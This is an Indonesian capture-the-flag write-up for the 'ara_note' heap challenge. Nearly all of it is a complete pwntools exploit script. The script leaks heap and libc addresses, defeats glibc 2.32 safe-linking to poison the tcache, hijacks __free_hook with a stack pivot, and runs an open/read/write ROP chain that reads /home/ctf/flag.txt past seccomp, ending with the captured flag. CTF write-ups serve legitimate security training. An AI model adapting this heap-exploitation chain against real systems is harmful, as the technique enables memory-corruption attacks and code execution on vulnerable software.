# ara_note
---
## Deskripsi
flag terletak di /home/ctf/flag.txt
## Solusi
Untuk menyelesaikan soal tersebut dapat menggunakan program yang telah dibuat sebagai berikut:
```
#!/usr/bin/env python2
from pwn import *
import sys

#MyTemplate
elf = ELF("./ara_note")
libc = ELF("./libc-2.32.so")
ld = ELF("./ld-2.32.so")

lokal = True
context.binary = elf
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False

if lokal:
    xp = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
else:
    host = ''
    port = ''
    xp = remote(host,port)

if Debug:
    context.terminal = ["tmux","splitw","-h"]
    cmd = "b *0x7ffff7e6ec11 \n c"
    gdb.attach(xp,cmd)

#Exploit Here
def add(idx, size):
    sl("1")
    sla(': ', str(idx))
    sla(': ', str(size))
    return ru('>')

def remove(idx):
    sl("2")
    sla(': ', str(idx))
    return ru('>')

def show(idx,size):
    sl("3")
    sla(': ', str(idx))
    sla(': ', str(size))


def write(idx, size, data):
    sl("4")
    sla(': ', str(idx))
    sla(': ', str(size))
    sa("Data : ",data)
    # return ru('>')

def setname(name):
	sl(str(0x1337))
	sa("1337 : ",name)
	return ru('>')

def defuscate(x,l=64):
    p = 0
    for i in range(l*4,0,-4): # 16 nibble
        v1 = (x & (0xf << i )) >> i
        v2 = (p & (0xf << i+12 )) >> i+12
        p |= (v1 ^ v2) << i
    return p

def obfuscate(p, adr):
    return p^(adr>>12)


pop_rdi = 0x000000000002858f
pop_rax = 0x0000000000045580
pop_rsi = 0x000000000002858d
pop_rdx = 0x0000000000114161
add_rsp_0x38 = 0x0000000000059a35
pop_rsp = 0x000000000003418a

flag = "/home/ctf/flag.txt\x00"
libc = ELF('./libc-2.32.so', checksec=False)



add(0, 0x28)
add(1, 0x28)
add(2, 0x28)
add(3, 0x800)
add(4, 0x28)

remove(2)
remove(1)
remove(3)

show(0, 0x98)
data = xp.recvline()
heap = defuscate(uu64(data[0x30:0x38]))
leak = uu64(data[0x90:0x98])
print hex(leak),hex(heap)


libc_base = leak - 0x1e3c00
print hex(libc_base)
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
syscall = libc_base + libc.symbols['execve']+9

p = "A"*0x28
p += p64(0x31)
p += p64(obfuscate(free_hook, heap-0x30))
write(0,len(p),p)
add(1, 0x28) # Use up chunk
add(2, 0x28) # This is the chosen one

write(2, 8, p64(libc_base + add_rsp_0x38))
# write(2, 8, p64(libc_base + add_rsp_0x38))
#
setname(p64(libc_base + pop_rsp)+p64(heap+0x80))
add(5,0x40)
write(5,len(flag),flag)
add(6,0x200)
#
p = p64(libc_base+pop_rdi)
p += p64(heap+0x30)
p += p64(libc_base+pop_rsi)
p += p64(0)*2
p += p64(libc_base + pop_rdx)
p += p64(0x50)*2
p += p64(libc_base + pop_rax)
p += p64(0x2)
p += p64(syscall)
p += p64(libc_base + pop_rax)
p += p64(0x0)
p += p64(libc_base+pop_rdi)
p += p64(0x3)
p += p64(libc_base+pop_rsi)
p += p64(heap+0x30+0x300)*2
p += p64(syscall)
p += p64(libc_base + pop_rax)
p += p64(0x1)
p += p64(libc_base+pop_rdi)
p += p64(0x1)
p += p64(libc_base+pop_rsi)
p += p64(heap+0x30+0x300)*2
p += p64(syscall)
#
write(6,len(p),p)
sl("2")
sla(': ', str(1))



xp.interactive()
```
#### ara2021{heap_plus_seccomp_easy_peasy_dt342}